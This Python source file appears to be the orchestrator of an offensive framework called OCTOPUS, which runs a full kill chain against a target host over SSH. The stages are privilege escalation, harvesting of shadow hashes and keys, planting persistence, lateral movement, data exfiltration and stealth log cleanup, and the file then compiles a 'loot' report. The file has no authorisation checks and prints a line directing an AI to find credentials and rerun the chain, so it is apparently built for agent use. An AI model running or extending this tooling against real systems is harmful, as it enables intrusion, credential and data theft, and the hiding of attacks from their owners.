#!/usr/bin/env python3
"""
Kill chain orchestrator: runs all stages.
"""

import logging
import os

try:
    import paramiko
except ImportError:
    paramiko = None

try:
    from config import CFG, find_all_wordlists, find_wordlist
except ImportError:
    CFG = {}
    def find_wordlist(cat): return ""
    def find_all_wordlists(cat): return []

from typing import Any, Callable, Optional, TypeVar, Union

from core.credentials import (
    CredentialRef,
    credential_material_for_execution,
    get_all_credential_refs_for_target,
    get_best_credential_ref,
    is_credential_handle,
    resolve_credential_handle,
)
from core.killchain.cleanup import stealth_cleanup
from core.killchain.exfil import data_exfil
from core.killchain.exploitation import auto_exploit
from core.killchain.lateral import lateral_move
from core.killchain.persistence import plant_persistence
from core.killchain.privesc import _harvest_credentials, run_privesc
from core.killchain.ssh_helpers import _ssh_connect
from core.killchain.vuln_assess import vuln_assess

logger = logging.getLogger("octopus.killchain.orchestrator")

_ProviderResult = TypeVar("_ProviderResult")
_CredentialInput = Union[CredentialRef, str]

# ANSI Colors
C_GREEN  = "\033[92m"
C_YELLOW = "\033[93m"
C_RED    = "\033[91m"
C_CYAN   = "\033[96m"
C_GREY   = "\033[90m"
C_BLUE   = "\033[94m"
C_MAGENTA = "\033[95m"
C_RESET  = "\033[0m"


# PARAMIKO SSH HELPERS (shared across stages)


def _resolve_killchain_credential(
    target: str,
    user: Optional[Union[str, CredentialRef]],
    password: Optional[_CredentialInput],
    credential: Optional[_CredentialInput],
) -> tuple[Optional[CredentialRef], str]:
    """Resolve only an opaque SSH credential reference from compatibility inputs."""

    selected = credential
    username_hint = ""

    if isinstance(user, CredentialRef) or is_credential_handle(user):
        if selected is not None or password is not None:
            return None, "[!] Ambiguous credential inputs are prohibited."
        selected = user
    else:
        username_hint = str(user or "").strip()
        if password is not None:
            if selected is not None:
                return None, "[!] Ambiguous credential inputs are prohibited."
            if isinstance(password, CredentialRef) or is_credential_handle(password):
                selected = password
            elif str(password):
                return None, "[!] Plaintext credential arguments are prohibited; use a credential:// handle."

    if selected is None:
        if username_hint:
            return None, "[!] A credential:// handle is required with an SSH username."
        return None, ""

    resolved = resolve_credential_handle(selected)
    if resolved is None:
        return None, "[!] Unknown credential handle."
    if resolved.service != "ssh" or resolved.target != target:
        return None, "[!] Credential handle scope mismatch."
    if username_hint and resolved.username != username_hint:
        return None, "[!] Credential handle username mismatch."
    return resolved, ""


def _call_ssh_provider(
    provider: Callable[..., _ProviderResult],
    target: str,
    credential: CredentialRef,
    port: int,
) -> _ProviderResult:
    """Reveal a credential only for one immediate provider invocation."""

    with credential_material_for_execution(credential) as material:
        return provider(target, material.username, material.password, port)


def _connect_with_credential(
    target: str,
    credential: CredentialRef,
    port: int,
) -> tuple[Any, str]:
    """Reveal only while Paramiko establishes an authenticated session."""

    with credential_material_for_execution(credential) as material:
        return _ssh_connect(target, material.username, material.password, port)


def run_full_killchain(
    target: str,
    user: Optional[Union[str, CredentialRef]] = None,
    password: Optional[_CredentialInput] = None,
    recon_data: str = "",
    port: int = 22,
    *,
    credential: Optional[_CredentialInput] = None,
) -> str:
    """
    Run the complete kill chain in sequence.
    Re-authenticates after privilege escalation before later stages.
    Order: Privesc → Harvest → Persist → Lateral → Exfil → Cleanup (LAST!)
    """
    selected_credential, credential_error = _resolve_killchain_credential(
        target,
        user,
        password,
        credential,
    )
    if credential_error:
        return credential_error

    print(f"\n  {C_RED}{'=' * 60}{C_RESET}")
    print(f"  {C_RED}  OCTOPUS FULL KILL CHAIN v8.1 -- {target}{C_RESET}")
    print(f"  {C_RED}{'=' * 60}{C_RESET}")

    full_output = ""

    # Stages 3-9 require SSH credentials
    if selected_credential is not None:
        selected_user = selected_credential.username
        full_output += (
            f"[*] Credentials available ({selected_user}@{target}) -- skipping external vuln/exploit stages.\n"
            f"[*] Proceeding directly to post-exploitation stages 3-9.\n\n"
        )
        print(f"  {C_GREEN}[+] Credentials available -- skipping stages 1-2, going to post-exploit{C_RESET}")

        # Stage 3: Privilege Escalation
        privesc_output = _call_ssh_provider(
            run_privesc,
            target,
            selected_credential,
            port,
        )
        full_output += privesc_output

        # Re-authenticate as root after privilege escalation.
        effective_credential = selected_credential
        if "ROOT ACCESS CONFIRMED" in privesc_output or "uid=0(root)" in privesc_output:
            re_authed = False

            # Method 1: Try root with known credentials from credential store
            try:
                root_credential = get_best_credential_ref(
                    target,
                    "ssh",
                    username="root",
                    prefer_privileged=True,
                )
                if root_credential is not None:
                    test_client, _test_err = _connect_with_credential(
                        target,
                        root_credential,
                        port,
                    )
                    if test_client:
                        test_client.close()
                        effective_credential = root_credential
                        re_authed = True
                        print(f"  {C_GREEN}[+] RE-AUTHENTICATED as root (credential store){C_RESET}")
                        full_output += "\n[+] Re-authenticated as root for stages 4-9\n"
            except Exception as e:
                logger.debug(
                    "Root re-auth via credential store failed (%s)",
                    type(e).__name__,
                )

            if not re_authed:
                print(
                    f"  {C_YELLOW}[!] Root re-auth failed — continuing as "
                    f"{selected_user} (rootbash may be available){C_RESET}"
                )
                full_output += f"\n[!] Root re-auth failed. Continuing as {selected_user}.\n"
                full_output += "[!] Note: /tmp/.mtr/rootbash may be available for local root commands.\n"

        # Stage 4: Credential Harvesting (from root = gets shadow, keys, etc.)
        try:
            harvest_client, harvest_err = _connect_with_credential(
                target,
                effective_credential,
                port,
            )
            if harvest_client:
                full_output += "\n" + _harvest_credentials(harvest_client, target)
                harvest_client.close()
            else:
                full_output += f"\n[-] Credential harvest SSH failed: {harvest_err}\n"
        except Exception as e:
            full_output += f"\n[-] Credential harvest error: {e}\n"

        # Stage 5: Persistence (from root = SSH keys, SUID, crontab)
        full_output += "\n" + _call_ssh_provider(
            plant_persistence,
            target,
            effective_credential,
            port,
        )

        # Stage 6: Lateral Movement
        full_output += "\n" + _call_ssh_provider(
            lateral_move,
            target,
            effective_credential,
            port,
        )

        # Stage 7: Data Exfiltration (from root = full access)
        full_output += "\n" + _call_ssh_provider(
            data_exfil,
            target,
            effective_credential,
            port,
        )

        # Cleanup must always remain the final stage.
        full_output += "\n" + _call_ssh_provider(
            stealth_cleanup,
            target,
            effective_credential,
            port,
        )
    else:
        # No creds — run full discovery pipeline
        # Stage 1: Vulnerability Assessment (always runs)
        full_output += vuln_assess(target, recon_data)

        # Stage 2: Automated Exploitation (always runs)
        full_output += "\n" + auto_exploit(target, recon_data)

        full_output += "\n[!] No SSH credentials available -- stages 3-9 skipped.\n"
        full_output += (
            "AI: Find credentials first, then run killchain_full with its "
            "credential:// handle.\n"
        )

    # Generate final report after all stages complete
    if selected_credential is not None:
        loot_base = os.path.expanduser("~/OCTOPUS/loot")
        loot_dir = os.path.join(loot_base, target.replace('.', '_'))
        os.makedirs(loot_dir, exist_ok=True)
        _generate_target_report(
            target,
            effective_credential.username,
            loot_dir,
            [],
            full_output,
        )

    return full_output


# STAGE 9: STEALTH CLEANUP


def _generate_target_report(host: str, user: str, loot_dir: str,
                            exfil_files: list, full_output: str):
    """Generate a comprehensive target intelligence report.
    Saves to loot_dir/<IP>_report.txt with all discovered credentials,
    keys, tokens, services, and kill chain results."""
    import re as _re
    from datetime import datetime as _dt

    report_path = os.path.join(loot_dir, f"{host.replace('.', '_')}_report.txt")
    print(f"    {C_GREEN}[*] Generating target report: {report_path}{C_RESET}")

    lines = []
    lines.append(f"{'═' * 70}")
    lines.append("  OCTOPUS TARGET INTELLIGENCE REPORT")
    lines.append(f"  Target: {host}")
    lines.append(f"  Generated: {_dt.now().strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append(f"  Initial Access: {user}@{host}")
    lines.append(f"{'═' * 70}")
    lines.append("")

    # ── CREDENTIALS SECTION ────────────────────────────────────
    lines.append("[CREDENTIALS DISCOVERED]")
    lines.append("-" * 40)
    # From the reference-only credential cache. Secret references and plaintext
    # are deliberately excluded from the report.
    all_creds = get_all_credential_refs_for_target(host)
    for service, credential_refs in all_creds.items():
        for credential_ref in credential_refs:
            lines.append(
                f"  [{service}] {credential_ref.username} "
                f"({credential_ref.auth_kind}; {credential_ref.handle})"
            )

    # From output text
    database_secrets = list(
        _re.finditer(
            r'(?:DB_PASSWORD|DB_PASS|MYSQL_PASSWORD)\s*[=:]\s*[\'"]?([^\s\'"#;]{3,80})',
            full_output,
            _re.IGNORECASE,
        )
    )
    api_secrets = list(
        _re.finditer(
            r'(?:API_KEY|SECRET_KEY|APP_SECRET|JWT_SECRET)\s*[=:]\s*[\'"]?([^\s\'"#;]{8,120})',
            full_output,
            _re.IGNORECASE,
        )
    )
    if database_secrets:
        lines.append(f"  [database] {len(database_secrets)} secret value(s) observed; redacted")
    if api_secrets:
        lines.append(f"  [api_key] {len(api_secrets)} secret value(s) observed; redacted")
    lines.append("")

    # ── PRIVATE KEYS SECTION ──────────────────────────────────
    if "PRIVATE KEY" in full_output:
        lines.append("[SSH PRIVATE KEYS FOUND]")
        lines.append("-" * 40)
        for m in _re.finditer(r'SSH PRIVATE KEY found: (\S+)', full_output):
            lines.append(f"  Key: {m.group(1)}")
        lines.append("")

    # ── SHADOW HASHES ─────────────────────────────────────────
    if "shadow" in full_output.lower() and "$" in full_output:
        lines.append("[SHADOW HASHES]")
        lines.append("-" * 40)
        for m in _re.finditer(r'(\w+):\s*(\$[\dy]+\$[^\s:]+)', full_output):
            lines.append(f"  {m.group(1)}: {m.group(2)[:50]}...")
        lines.append("")

    # ── EXFILTRATED FILES ─────────────────────────────────────
    if exfil_files:
        lines.append("[EXFILTRATED FILES]")
        lines.append("-" * 40)
        for ef in exfil_files:
            lines.append(f"  {ef['remote']} → {ef['local']} ({ef['size']} bytes)")
        lines.append("")

    # ── NETWORK INFO ──────────────────────────────────────────
    lines.append("[NETWORK INFORMATION]")
    lines.append("-" * 40)
    for m in _re.finditer(r'Internal subnet: (\S+)', full_output):
        lines.append(f"  Subnet: {m.group(1)}")
    for m in _re.finditer(r'DISCOVERED INTERNAL HOSTS: (\d+)', full_output):
        lines.append(f"  Internal hosts found: {m.group(1)}")
    for m in _re.finditer(r'→ (\d+\.\d+\.\d+\.\d+)', full_output):
        lines.append(f"  Internal host: {m.group(1)}")
    lines.append("")

    # ── KILL CHAIN RESULTS ────────────────────────────────────
    lines.append("[KILL CHAIN RESULTS]")
    lines.append("-" * 40)
    stages = [
        ("Privilege Escalation", "PRIVILEGE ESCALATION"),
        ("Persistence", "Persistence methods planted"),
        ("Lateral Movement", "Hosts compromised"),
        ("Data Exfiltration", "Files exfiltrated"),
    ]
    for stage_name, marker in stages:
        if marker in full_output:
            m = _re.search(rf'{_re.escape(marker)}' + r'[:\s]*(\d+)', full_output)
            count = m.group(1) if m else "?"
            lines.append(f"  {stage_name}: {count}")
    lines.append("")
    lines.append(f"{'═' * 70}")
    lines.append(f"Report saved to: {report_path}")
    lines.append(f"Loot directory: {loot_dir}")

    # Write report
    try:
        with open(report_path, "w") as f:
            f.write("\n".join(lines))
        print(f"    {C_GREEN}[+] Target report saved: {report_path}{C_RESET}")
    except Exception as e:
        print(f"    {C_RED}[!] Failed to save report: {e}{C_RESET}")


# QUICK TEST

if __name__ == "__main__":
    target = input("Target IP: ").strip()
    credential_handle = input("SSH credential:// handle (or Enter to skip): ").strip()

    if credential_handle:
        print(run_full_killchain(target, credential=credential_handle))
    else:
        print(vuln_assess(target))
        print(auto_exploit(target))
